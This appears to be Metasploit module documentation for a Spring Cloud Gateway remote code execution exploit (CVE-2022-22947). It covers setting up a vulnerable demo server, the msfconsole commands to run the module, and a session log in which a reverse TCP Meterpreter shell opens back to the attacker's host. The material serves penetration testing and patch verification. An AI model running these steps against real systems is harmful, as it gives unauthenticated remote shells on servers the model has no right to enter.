## Vulnerable Application

The vulnerability exploits [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947) an unauthenticated RCE
vulnerability in Spring Cloud Gateway. According to [VMware](https://tanzu.vmware.com/security/cve-2022-22947)
the versions affected are:

- 3.1.0
- 3.0.0 to 3.0.6
- Older, unsupported versions are also affected

A sample demo [project](https://github.com/wdahlenburg/spring-gateway-demo) is available,
which can be used to run a vulnerable server by following the installation instructions below.
    
### Installation Instructions

```bash
    # To use the pre-compile vulnerable application
    wget https://github.com/wdahlenburg/spring-gateway-demo/releases/download/v.0.0.1/spring-gateway-demo-0.0.1-SNAPSHOT.jar
    sudo apt install default-jdk
    java -jar spring-gateway-demo-0.0.1-SNAPSHOT.jar # This will host the app on port 9000


    # If you want to compile for a version of spring cloud gateway on your own
    git clone https://github.com/wdahlenburg/spring-gateway-demo.git

    # In pom.xml, change the version in '<spring-cloud.version>2021.0.1-SNAPSHOT</spring-cloud.version>'. 
    # To see which spring cloud version includes which version of spring cloud gateway, 
    # look here : https://repo1.maven.org/maven2/org/springframework/cloud/spring-cloud-dependencies/

    apt install maven
    mvn package -DskipTests
    java -jar target/spring-gateway-demo-0.0.1-SNAPSHOT.jar # This will host the app on port 9000
```


## Verification Steps

- Run the vulnerable server
- Start msfconsole
- Do: `use exploit/linux/http/spring_cloud_gateway_rce`
- Do: `set RHOSTS <server_ip>`
- Do: `set LHOST <metasploit_machine_ip>`
- Do: `set RPORT 9000`
- Do: `run`
- You should get a Meterpreter shell.

## Options

No particular option to be set

## Scenarios

### Spring Cloud gateway version 3.1.0 on Linux kali 5.18.0-kali5-amd64

```
msf6 > use exploit/linux/http/spring_cloud_gateway_rce
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/spring_cloud_gateway_rce) > set RHOSTS 192.168.19.140
RHOSTS => 192.168.19.140
msf6 exploit(linux/http/spring_cloud_gateway_rce) > set RPORT 9000
RPORT => 9000
msf6 exploit(linux/http/spring_cloud_gateway_rce) > set LHOST 192.168.1.7
LHOST => 192.168.1.7
msf6 exploit(linux/http/spring_cloud_gateway_rce) > run

[*] Started reverse TCP handler on 192.168.1.7:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if server is vulnerable
[*] Triggering code execution using routes
[+] Route deleted
[+] The target is vulnerable.
[*] Executing Unix Command for cmd/unix/python/meterpreter/reverse_tcp
[*] Triggering code execution using routes
[*] Sending stage (40164 bytes) to 192.168.1.7
[*] Meterpreter session 7 opened (192.168.1.7:4444 -> 192.168.1.7:53264) at 2022-10-11 17:44:53 -0400
[+] Route deleted

meterpreter >
```

